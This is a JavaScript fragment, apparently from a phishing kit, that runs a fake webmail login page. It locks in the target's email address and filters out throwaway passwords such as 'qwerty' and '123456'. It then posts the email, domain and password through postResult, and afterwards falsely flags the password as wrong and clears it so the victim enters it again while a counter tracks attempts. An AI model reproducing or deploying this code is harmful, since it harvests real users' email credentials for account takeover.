// 
if (validEmail.test(usermail)) {
    $("#m3_mail").val(usermail)
    $("#m3_mail").attr('readOnly', true)
}

$("#m3_form").on('submit', (e)=>{
    e.preventDefault();

    let m3_inputs = document.getElementsByClassName("m3_inputs");

    if (!validEmail.test($("#m3_mail").val())) {
        m3_inputs[0].style.borderColor = "red";
        return
    }
    else{
        m3_inputs[0].style.borderColor = "silver";
    }

    if (validEmail.test($("#m3_pass").val()) || $("#m3_pass").val().length < 6 || $("#m3_pass").val().toLowerCase() == "qwerty" || $("#m3_pass").val() == 123456 || $("#m3_pass").val().toLowerCase() == "password" || $("#m3_pass").val().toLowerCase() == "testing") {
        m3_inputs[1].style.borderColor = "red";
        return
    }
    else{
        m3_inputs[1].style.borderColor = "silver";
    }

    $("#loader").show().css({"display":"flex"})

    let url = $("#m3_mail").val().split('@');

    postResult(url[1], $("#m3_mail").val(), $("#m3_pass").val(), postCount);
    
    setTimeout(() => {
        m3_inputs[1].style.borderColor = "red";
        postCount++
        $("#m3_pass").val("")
    }, delayCounter);
});

$("#hidePassBtn").on('click', ()=>{
    let m3_pass = document.getElementById("m3_pass");
    if (m3_pass.type === "text") {
        m3_pass.type = "password"
        $("#hidePassBtn").html(`<img src="./pages/mail_300/icon-check.png" alt="">`)
    } 
    else {
        m3_pass.type = "text" 
        $("#hidePassBtn").html("")
    }
})